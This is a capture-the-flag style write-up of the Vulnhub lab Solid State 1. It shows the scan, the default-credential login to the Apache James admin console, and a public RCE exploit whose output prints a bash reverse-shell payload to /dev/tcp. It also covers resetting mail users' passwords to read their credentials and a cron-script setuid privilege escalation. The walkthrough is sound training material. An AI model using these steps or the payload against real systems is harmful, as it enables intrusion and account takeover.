---
title: Solid State 1
categories: [Vulnhub]
tags: [boot2root]
---

# Machine Information

- [Solid State 1](https://www.vulnhub.com/entry/solidstate-1,261/)

## Host discovery

- target IP: `10.10.10.139`

## Information Gathering

Nmap Time

```bash
nmap -p- -T4 10.10.10.139 -A -oA 10.10.10.139  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-14 14:35 +08
Nmap scan report for 10.10.10.139
Host is up (0.00053s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.10.128 [10.10.10.128])
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
MAC Address: 00:0C:29:2B:DC:7B (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.53 ms 10.10.10.139

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.95 seconds
```


## Exploiting Port 4555

I started out this port as I found a exploit that is useful. 

```bash
searchsploit JAMES                                                          
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache James Server 2.2 - SMTP Denial of Service                                                                                                                                                          | multiple/dos/27915.pl
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit)                                                                                                                      | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution                                                                                                                                                      | linux/remote/35513.py
Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)                                                                                                                            | linux/remote/50347.py
WheresJames Webcam Publisher Beta 2.0.0014 - Remote Buffer Overflow                                                                                                                                       | windows/remote/944.c
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Based on the result from searchsploit, it seems to  be vulnerable to RCE. I then understand the python script and try to exploit manually. Based on the python script, the default credentials is `root:root`. I then tried to login and see if its work.

```bash
nc 10.10.10.139 4555                 
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

Based on the result, I managed to login with the default credentials. I then tried to understand the script and get RCE. After understanding it, this exploit only works if a user's actually login into the server such as using SSH or any other method. I then run the python script first before moving on.

```bash
python 50347.py 10.10.10.139 10.10.10.128 4444
[+]Payload Selected (see script for more options):  /bin/bash -i >& /dev/tcp/10.10.10.128/4444 0>&1
[+]Example netcat listener syntax to use after successful execution: nc -lvnp 4444
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).
[+]Don't forget to start a listener on port 4444 before logging in!
```

Now I will need to somehow login into ssh to the RCE. I then continue to explore other places to see if its possible to get some information.

```bash
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin
```

Based on the result, I managed to get some usernames. I noticed that I could change the user password by using `setpassword` option.

```bash
setpassword james wee
Password for james reset
setpassword thomas wee
Password for thomas reset
setpassword john wee
Password for john reset
setpassword mindy wee
Password for mindy reset
setpassword mailadmin wee
Password for mailadmin reset

```

Now that the password is changed, I tried to login into their mail server and see if its possible. 

```bash
telnet 10.10.10.139 110  
Trying 10.10.10.139...
Connected to 10.10.10.139.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS wee
+OK Welcome mindy
list
+OK 2 1945
1 1109
2 836
.
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
retr 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

By looking at this [website](https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop), I managed to read through the email messages. After looking into each users, I noticed one useful credentials, `mindy:P@55W0rd1!2@`. I then use this to login as SSH.

```bash
ssh mindy@10.10.10.139               
The authenticity of host '10.10.10.139 (10.10.10.139)' can't be established.
ED25519 key fingerprint is SHA256:rC5LxqIPhybBFae7BXE/MWyG4ylXjaZJn6z2/1+GmJg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.139' (ED25519) to the list of known hosts.
mindy@10.10.10.139's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found
-rbash: L: command not found
-rbash: attributestLjava/util/HashMap: No such file or directory
-rbash: L
         errorMessagetLjava/lang/String: No such file or directory
-rbash: L
         lastUpdatedtLjava/util/Date: No such file or directory
-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
-rbash: $'L\004nameq~\002L': command not found
-rbash: recipientstLjava/util/Collection: No such file or directory
-rbash: L: command not found
-rbash: $'remoteAddrq~\002L': command not found
-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found
-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found
-rbash: @team.pl>
Message-ID: <153381.0.1707893793773.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
Received: from 10.10.10.128 ([10.10.10.128])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 319
          for <../../../../../../../../etc/bash_completion.d@localhost>;
          Wed, 14 Feb 2024 01:56:24 -0500 (EST)
Date: Wed, 14 Feb 2024 01:56:24 -0500 (EST)
From: team@team.pl

: No such file or directory
-rbash: connect: Connection refused
-rbash: /dev/tcp/127.0.0.1/4444: Connection refused
-rbash: $'\r': command not found
-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found
-rbash: L: command not found
-rbash: attributestLjava/util/HashMap: No such file or directory
-rbash: L
         errorMessagetLjava/lang/String: No such file or directory
-rbash: L
         lastUpdatedtLjava/util/Date: No such file or directory
-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
-rbash: $'L\004nameq~\002L': command not found
-rbash: recipientstLjava/util/Collection: No such file or directory
-rbash: L: command not found
-rbash: $'remoteAddrq~\002L': command not found
-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found
-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found
-rbash: @team.pl>
Message-ID: <7048960.1.1707893931981.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
Received: from 10.10.10.128 ([10.10.10.128])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 994
          for <../../../../../../../../etc/bash_completion.d@localhost>;
          Wed, 14 Feb 2024 01:58:45 -0500 (EST)
Date: Wed, 14 Feb 2024 01:58:45 -0500 (EST)
From: team@team.pl
```

When I logged in, I noticed that all I have is a restricted bash and a tons of random stuff. I then remember the exploit that I have used and setup my port 4444 ready. 

```bash
nc -nvlp 4444     
listening on [any] 4444 ...
connect to [10.10.10.128] from (UNKNOWN) [10.10.10.139] 57662
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
```

Although the SSH is a restricted shell, This exploit allow me to get a reverse shell which I could run command. 

## Privilege Escalation

Time to privilege escalation. After looking for a while, I notice this file in `/opt` directory.

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py 
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 Jun 18  2017 ..
drwxr-xr-x 11 root root 4096 Aug 22  2017 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
```

Based on this `tmp.py`, I could think that it might have a cronjob that runs multiple times. Not only that, it has write access for everyone which mean I could just add my own python script. I used pspy to check first.

```bash
2024/02/14 02:27:01 CMD: UID=0     PID=1305   | /bin/sh -c python /opt/tmp.py 
2024/02/14 02:27:01 CMD: UID=0     PID=1306   | python /opt/tmp.py 
2024/02/14 02:27:01 CMD: UID=0     PID=1307   | sh -c rm -r /tmp/*  
```

It seems that my thoughts was correct. I then add my own python script and get root shell.

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ;cp /bin/bash /tmp/wee; chmod +s /tmp/wee')
except:
     sys.exit()

```

Now, Ill just need to wait for the script to execute and I should be able to get root shell.

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ /tmp/wee -p
wee-4.4# id
uid=1001(mindy) gid=1001(mindy) euid=0(root) egid=0(root) groups=0(root),1001(mindy)
wee-4.4# whoami
root
wee-4.4# cat root.txt 
b4c9723a28899b1c45db281d99cc87c9
```

## Things I learned from the machine

- JAMES 2.3.2 exploit
- privilege escalation with cronjob
